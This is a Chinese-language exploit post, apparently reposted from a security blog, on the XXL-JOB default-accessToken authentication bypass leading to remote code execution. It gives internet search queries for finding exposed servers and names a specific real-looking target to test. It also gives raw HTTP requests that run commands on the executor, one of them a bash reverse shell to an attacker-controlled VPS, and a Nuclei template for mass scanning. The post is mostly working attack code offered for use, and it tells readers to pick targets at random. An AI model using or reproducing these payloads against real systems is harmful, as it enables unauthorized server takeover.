#  XXL-JOB默认accessToken身份绕过RCE漏洞   
 船山信安   2024-12-17 16:00  
  
XXL-JOB 是一款开源的分布式任务调度平台，用于实现大规模任务的调度和执行。XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中如果没有修改默认值，攻击者可利用此绕过认证调用 executor，执行任意代码，从而获取服务器权限。经分析和研判，该漏洞利用难度低，可导致远程代码执行。  
## 漏洞复现  
  
步骤一：在Fofa中搜索以下语法并随机确定要进行攻击测试的目标....  
```
# 搜索语法 fofa "invalid request, HttpMethod not support" && port="9999" # 搜索语法-360Quake html_hash: "1b5af7109cb2b269eb02ba1ef4629bd8" # 检测目标 http://uat.cxmssc.joydigitseniorliving.com:9999
```  
  
步骤二：开启代理并打开BP对其首页进行抓包拦截....修改请求包内容。返回{"code":200}且DNSlog存在访问记录，即存在漏洞。  
```
POST /run HTTP/1.1 Host: ip User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Connection: close Content-Length: 376 Content-Type: application/json XXL-JOB-ACCESS-TOKEN: default_token Accept-Encoding: gzip { "jobId": 181584, "executorHandler": "demoJobHandler", "executorParams": "demoJobHandler", "executorBlockStrategy": "COVER_EARLY", "executorTimeout": 0, "logId": 187270, "logDateTime": 116989791110, "glueType": "GLUE_SHELL", "glueSource": "ping x.x.x.x", "glueUpdatetime": 116989791110, "broadcastIndex": 0, "broadcastTotal": 0 }
```  
  
每次发送可以把jobId值改一下  
  
步骤三：VPS监听一个端口，使用命令即可反弹shell。  
```
POST /run HTTP/1.1 Host: ip User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Connection: close Content-Length: 405 Content-Type: application/json XXL-JOB-ACCESS-TOKEN: default_token Accept-Encoding: gzip { "jobId": 183125, "executorHandler": "demoJobHandler", "executorParams": "demoJobHandler", "executorBlockStrategy": "COVER_EARLY", "executorTimeout": 0, "logId": 187270, "logDateTime": 116989791110, "glueType": "GLUE_SHELL", "glueSource": "/bin/bash -i >& /dev/tcp/ip/port 0>&1", "glueUpdatetime": 116989791110, "broadcastIndex": 0, "broadcastTotal": 0 }
```  
## 批量脚本  
```
id: xxl-job-executor-default-accesstoken-rce info: name: XXL-JOB默认accessToken身份绕过RCE author: wuha severity: high description: XXL-JOB 默认 accessToken 身份绕过，可导致 RCE metadata: max-request: 1 verified: true fofa-query: app="XXL-JOB" tags: xxl-job,rce variables: randjobid: "{{rand_int(999,999999)}}" datetime: '{{date_time("%Y-%M-%D %H:%m:%s")}}' unix_time: '{{date_time("{{datetime}}",unix_time())}}' http: - raw: - | @timeout: 25s POST /run HTTP/1.1 Host: {{Host}}:9999 XXL-JOB-ACCESS-TOKEN: default_token Content-Type: application/json { "jobId": {{randjobid}}, "executorHandler": "demoJobHandler", "executorParams": "demoJobHandler", "executorBlockStrategy": "COVER_EARLY", "executorTimeout": 0, "logId": {{randjobid}}, "logDateTime": {{unix_time}}, "glueType": "GLUE_SHELL", "glueSource": "ping {{Host}}.{{randjobid}}.{{interactsh-url}}", "glueUpdatetime": {{unix_time}}, "broadcastIndex": 0, "broadcastTotal": 0 } req-condition: true matchers-condition: and matchers: - type: word part: interactsh_protocol # Confirms the DNS Interaction words: - "dns"</code></pre> <span class="cke_reset cke_widget_drag_handler_container"><img class="cke_reset cke_widget_drag_handler" data-cke-widget-drag-handler="1" height="15" role="presentation" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动" width="15">﻿
```  
  
转自  https://www.freebuf.com/vuls/416273.html  
  
